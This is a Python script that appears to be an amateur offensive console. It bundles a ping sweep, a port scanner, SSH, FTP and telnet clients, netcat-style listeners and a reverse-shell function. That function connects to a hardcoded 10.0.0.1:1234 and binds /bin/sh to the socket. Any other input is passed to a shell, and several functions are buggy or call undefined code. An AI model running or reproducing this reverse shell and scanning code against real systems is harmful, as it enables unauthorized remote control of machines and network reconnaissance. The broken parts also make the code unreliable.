import os
import sys
import socket
import time
import subprocess
from  paramiko import SSHClient, SFTPClient
from ftplib import FTP
import telnetlib 

def hostdiscover(inp):
    try:
        addrbase = inp.split('.')[:3]
    except Exception:
        print("[!] usage hostdicover local.ip.addr.0")
    
    for i in range(1,254):
        if os.system("ping -n 1" + addrbase + str(i)) == 0:
            print("host is up at:" + addrbase + str(i))

def portscan(inp):
    try:
        openports = []
        addr = inp.split(' ')[1]
        if '-' in inp:
            portrange = inp.split(" ")[2]
            for port in range(int(portrange.split("-")[0]),int(portrange.split("-")[1])):
                sock = socket.socket()
                res = sock.connect_ex((addr,port))
                if res == 0:
                    openports.append(port)
        else:
            for port in range(1,1025):
                sock = socket.socket()
                res = sock.connect_ex((addr,port))
                if res == 0:
                    openports.append(port)
        for ports in openports:
            print("[+] port number:" + port + "is open in host:" + addr)
    except IndexError:
        print("[!] usage is portscan <addr> <portrange> optionl")
        return None
    except Exception as e:
        print(e)

def ssh(inp):
    try:
        password = inp.split(' ')[2]
        username = (inp.split('@')[0])[4:]
        addr = inp.split('@')[1].split(' ')[0]
    except Exception:
        print("[!] usage ssh <user>@<serveraddr> <password>")
        return None
    try:
        client = SSHClient()
        client.load_system_host_keys()
        client.connect(addr,username=username,password=password)
        client.invoke_shell()
    except Exception as e:
        print(e)

def netcat(inp):
    try:
        addr = inp.split(" ")[1]
        port = inp.split(" ")[2]
    except Exception:
        print("[!] useage nc <address> <port>")
    try:
        sock = socket.socket()
        sock.connect((addr,int(port)))
        print("[+] connection has been established")
        while 1:
            senddata = input(">")
            if senddata == "exit": sock.close(); break
            sock.send(senddata.encode())
            data = sock.recv(1024)
            print(repr(data))
    except Exception as e:
        print(e)

def netcatserver(inp):
    try:
        port = int(inp.split(' ')[1])
    except Exception:
        print("[!] useage ncserver <port>")
    try:
        sock = socket.socket()
        sock.bind(('0.0.0.0',port))
        sock.listen(1)
        conn , addr = sock.accept()
        print("[+] connection from: " + addr)
        while 1:
            data = conn.recv(1024)
            if not data: break
            senddata = input(">")
            if senddata == "exit": break
            conn.sendall(senddata.encode())
        conn.close()
    except Exception as e:
        print(e)

def ftpclient(inp):
    try:
        ftp = FTP(inp.split(' '))
    except Exception:
        print("[!] useage ftp <serveraddr>")
    username = input("enter username: ")
    password = input("enter password: ")
    try:
        ftp.login(username,password)
        print("[+] connection has been established")
        while 1:
            cmd = input(">")
            if cmd == "exit":break
            ftp.sendcmd(cmd)
    except Exception as e:
        print(e)

def reverseshell(inp):
    try:
        addr = inp.split(' ')[1]
        port = inp.split(' ')[2]
    except Exception:
        print("[!] useage rshell <addr> <port>")
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.0.0.1",1234))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])
    except Exception as e:
        print(e)

def telnet(inp):
    try:
        addr = inp.split(' ')[1]
        port = int(inp.split(' ')[2])
    except Exception:
        print("[!] usage telnet <addr> <port>")
    client = telnetlib.Telnet(addr,port)
    client.interact()

def handler(inp):
    inp = str(inp)
    if inp.startswith("nc "):
        netcat(inp)
        return None
    if inp.startswith("wgetf"):
        wgetfile(inp)
        return None
    if inp.startswith("ncserver"):
        netcatserver(inp)
        return None
    if inp.startswith("ssh"):
        ssh(inp)
        return None
    if inp.startswith("ftp"):
        ftpclient(inp)
        return None
    if inp.startswith("portscan"):
        portscan(inp)
        return None
    if inp.startswith("telnet"):
        telnet(inp)
        return None
    if inp.startswith("rshell"):
        reverseshell(inp)
        return None
    if inp.startswith("hostdiscover"):
        hostdiscover(inp)
        return None
    if inp.startswith("exit"):
        sys.exit()
    p = subprocess.Popen(inp,shell=True)


def Console():
    while 1:
        print()
        print()
        handler(input(">"))
        time.sleep(0.5)


Console()